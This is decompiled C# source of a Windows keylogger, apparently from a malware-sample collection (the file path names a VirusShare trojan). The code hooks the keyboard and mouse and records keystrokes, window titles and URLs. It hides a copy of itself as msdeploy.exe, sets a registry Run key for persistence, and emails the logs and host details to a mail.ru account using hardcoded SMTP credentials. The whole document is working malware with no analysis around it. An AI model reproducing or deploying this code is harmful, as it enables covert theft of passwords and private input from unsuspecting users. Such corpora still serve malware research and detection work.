// Decompiled with JetBrains decompiler
// Type: svchost.Program
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5F810CD7-4751-4516-A451-E3D5DB1E7D3C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Foreign.mxsg-767d7a244c93f1b0715b0106741f32dbd0bce3a7.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace svchost
{
  internal class Program
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private const byte VK_SHIFT = 16;
    private const byte VK_CAPITAL = 20;
    private const int WH_MOUSE_LL = 14;
    private const int WM_LBUTTONDOWN = 513;
    private static Program.HookProc k_hproc = new Program.HookProc(Program.KHC);
    private static Program.HookProc m_hproc = new Program.HookProc(Program.MHC);
    private static IntPtr k_ID = IntPtr.Zero;
    private static IntPtr m_ID = IntPtr.Zero;
    private static StreamWriter sw;
    private static string prev_window_title = (string) null;
    private static ushort prev_layout = 0;
    private static bool sending_clearing = false;
    private static Mutex m_mutex;

    private static void Main()
    {
      if (Program.InstanceExists())
        return;
      try
      {
        Program.saveToMSFolder();
        Program.runAppOnStartup();
        Program.markLoggingStartup();
        Program.k_ID = Program.SKH(Program.k_hproc);
        Program.m_ID = Program.SMH(Program.m_hproc);
        Application.Run();
        Program.UnhookWindowsHookEx(Program.k_ID);
        Program.UnhookWindowsHookEx(Program.m_ID);
      }
      catch
      {
        Application.Restart();
      }
    }

    private static IntPtr SKH(Program.HookProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr SMH(Program.HookProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return Program.SetWindowsHookEx(14, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr KHC(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
        Program.handleKey((Keys) Marshal.ReadInt32(lParam));
      return Program.CallNextHookEx(Program.k_ID, nCode, wParam, lParam);
    }

    private static IntPtr MHC(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 513)
        Program.handleClick(MouseButtons.Left);
      return Program.CallNextHookEx(Program.m_ID, nCode, wParam, lParam);
    }

    private static void handleKey(Keys key)
    {
      if (Program.sending_clearing)
        return;
      bool flag1 = ((int) Program.GetKeyState(16) & 128) == 128;
      bool flag2 = Program.GetKeyState(20) != (short) 0;
      if (key.ToString().Length > 1 && key.ToString() != "Space" && !ConstCollections.Oems.Contains(key) && !ConstCollections.Nums.Contains(key))
      {
        Program.handleServiceKey(key);
      }
      else
      {
        char ch;
        if (key.ToString() == "Space")
          ch = ' ';
        else if (ConstCollections.Oems.Contains(key))
        {
          ch = Program.transformOems(key);
          if (flag2 ^ flag1)
            ch = ConstCollections.CapitalOems[ch];
        }
        else if (ConstCollections.Nums.Contains(key))
        {
          ch = Program.transformNums(key);
          if (flag2 ^ flag1)
            ch = ConstCollections.CapitalNums[ch];
        }
        else
        {
          ch = key.ToString()[0];
          if (!(flag2 ^ flag1))
            ch = char.ToLower(ch);
        }
        Program.handleCharKey(ch);
      }
    }

    private static void handleClick(MouseButtons button)
    {
      if (Program.sending_clearing || button != MouseButtons.Left)
        return;
      using (Program.sw = new StreamWriter((Stream) System.IO.File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
      {
        Program.printActiveWindowTitle(Program.GetForegroundWindow(), Program.sw);
        Program.sw.WriteLine("[Click]");
      }
    }

    private static void handleServiceKey(Keys key)
    {
      if (new FileInfo(Path.GetTempPath() + "REG7920.tmp").Length >= 10000L)
      {
        Program.sending_clearing = true;
        Program.sendLog();
        Program.clearLog();
        Program.sending_clearing = false;
        Application.Restart();
      }
      else
      {
        if (!(key.ToString() != "LShiftKey") || !(key.ToString() != "RShiftKey"))
          return;
        using (Program.sw = new StreamWriter((Stream) System.IO.File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
          Program.printKeyData(key.ToString(), Program.sw);
      }
    }

    private static void handleCharKey(char c)
    {
      using (Program.sw = new StreamWriter((Stream) System.IO.File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
      {
        IntPtr foregroundWindow = Program.GetForegroundWindow();
        ushort keyboardLayout = Program.GetKeyboardLayout(Program.GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero));
        Program.printActiveWindowTitle(foregroundWindow, Program.sw);
        Program.printCurrentKeyboardLayout(keyboardLayout, Program.sw);
        Program.printKeyChar(keyboardLayout, c, Program.sw);
      }
    }

    private static char transformOems(Keys key)
    {
      char ch;
      switch (key)
      {
        case Keys.OemSemicolon:
          ch = ';';
          break;
        case Keys.Oemplus:
          ch = '=';
          break;
        case Keys.Oemcomma:
          ch = ',';
          break;
        case Keys.OemMinus:
          ch = '-';
          break;
        case Keys.OemPeriod:
          ch = '.';
          break;
        case Keys.OemQuestion:
          ch = '/';
          break;
        case Keys.Oemtilde:
          ch = '`';
          break;
        case Keys.OemOpenBrackets:
          ch = '[';
          break;
        case Keys.OemPipe:
          ch = '\\';
          break;
        case Keys.OemCloseBrackets:
          ch = ']';
          break;
        case Keys.OemQuotes:
          ch = "'"[0];
          break;
        default:
          ch = '#';
          break;
      }
      return ch;
    }

    private static char transformNums(Keys key)
    {
      char ch;
      switch (key)
      {
        case Keys.D0:
          ch = '0';
          break;
        case Keys.D1:
          ch = '1';
          break;
        case Keys.D2:
          ch = '2';
          break;
        case Keys.D3:
          ch = '3';
          break;
        case Keys.D4:
          ch = '4';
          break;
        case Keys.D5:
          ch = '5';
          break;
        case Keys.D6:
          ch = '6';
          break;
        case Keys.D7:
          ch = '7';
          break;
        case Keys.D8:
          ch = '8';
          break;
        case Keys.D9:
          ch = '9';
          break;
        default:
          ch = '#';
          break;
      }
      return ch;
    }

    private static void printKeyData(string key, StreamWriter sw)
    {
      if (ConstCollections.ServiceKeys.ContainsKey(key))
        sw.WriteLine("[" + ConstCollections.ServiceKeys[key] + "]");
      else
        sw.WriteLine("[" + key + "]");
    }

    private static void printActiveWindowTitle(IntPtr handle, StreamWriter sw)
    {
      int num = 256;
      StringBuilder text = new StringBuilder(num);
      if (Program.GetWindowText(handle, text, num) <= 0 || !(Program.prev_window_title != text.ToString()))
        return;
      sw.WriteLine(Environment.NewLine + "[" + (object) DateTime.Now + " " + text.ToString() + "]");
      Program.printCurrentUrl(handle, text.ToString(), sw);
      Program.prev_window_title = text.ToString();
    }

    private static void printCurrentUrl(IntPtr handle, string title, StreamWriter sw)
    {
      string url = UrlGetter.getUrl(handle, title);
      if (string.IsNullOrEmpty(url))
        return;
      sw.WriteLine(url);
    }

    private static void printCurrentKeyboardLayout(ushort current_layout, StreamWriter sw)
    {
      if ((int) Program.prev_layout == (int) current_layout)
        return;
      if (current_layout.ToString() == "1033")
        sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: EN-us]");
      else if (current_layout.ToString() == "2057")
        sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: EN-gb]");
      else if (current_layout.ToString() == "1049")
        sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: RU-ru]");
      else
        sw.WriteLine(Environment.NewLine + "[раскладка клавиатуры: " + current_layout.ToString() + "]");
      Program.prev_layout = current_layout;
    }

    private static void printKeyChar(ushort current_layout, char keychar, StreamWriter sw)
    {
      if (current_layout.ToString() == "1049")
      {
        if (ConstCollections.EngRusDict.ContainsKey(keychar))
          sw.Write(ConstCollections.EngRusDict[keychar]);
        else
          sw.Write(keychar.ToString());
      }
      else
        sw.Write(keychar.ToString());
    }

    private static void sendLog()
    {
      using (MailMessage message = new MailMessage())
      {
        message.From = new MailAddress("loup67@mail.ru", "G-Man", Encoding.Default);
        message.To.Add("loup67@mail.ru");
        message.Subject = "flawless victory";
        message.Body = "Machine Name: " + Environment.MachineName + Environment.NewLine;
        MailMessage mailMessage1 = message;
        mailMessage1.Body = mailMessage1.Body + "OS Version: " + (object) Environment.OSVersion + Environment.NewLine;
        MailMessage mailMessage2 = message;
        mailMessage2.Body = mailMessage2.Body + "User Name: " + Environment.UserName + Environment.NewLine;
        MailMessage mailMessage3 = message;
        mailMessage3.Body = mailMessage3.Body + "Hostname: " + Dns.GetHostName();
        message.Attachments.Add(new Attachment(Path.GetTempPath() + "REG7920.tmp"));
        SmtpClientEx smtpClientEx = new SmtpClientEx("smtp.mail.ru", 25);
        smtpClientEx.Credentials = (ICredentialsByHost) new NetworkCredential("loup67@mail.ru", "halifat67");
        smtpClientEx.LocalHostName = "mail.ru";
        smtpClientEx.Send(message);
      }
    }

    private static void clearLog()
    {
      using (System.IO.File.Create(Path.GetTempPath() + "REG7920.tmp"))
        ;
    }

    private static void saveToMSFolder()
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft"))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft");
      if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe"))
        return;
      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe");
      System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe", FileAttributes.Hidden);
    }

    private static void runAppOnStartup() => Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue("MSDeploy", (object) (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\msdeploy.exe"));

    private static void markLoggingStartup()
    {
      using (Program.sw = new StreamWriter((Stream) System.IO.File.Open(Path.GetTempPath() + "REG7920.tmp", FileMode.Append, FileAccess.Write)))
        Program.sw.WriteLine(Environment.NewLine + "[" + DateTime.Now.ToString() + " ПРОЦЕСС СТАРТОВАЛ]");
    }

    private static bool InstanceExists()
    {
      bool createdNew;
      Program.m_mutex = new Mutex(false, "OneInstanceApplication", out createdNew);
      return !createdNew;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      Program.HookProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    private static extern short GetKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern ushort GetKeyboardLayout([In] int idThread);

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
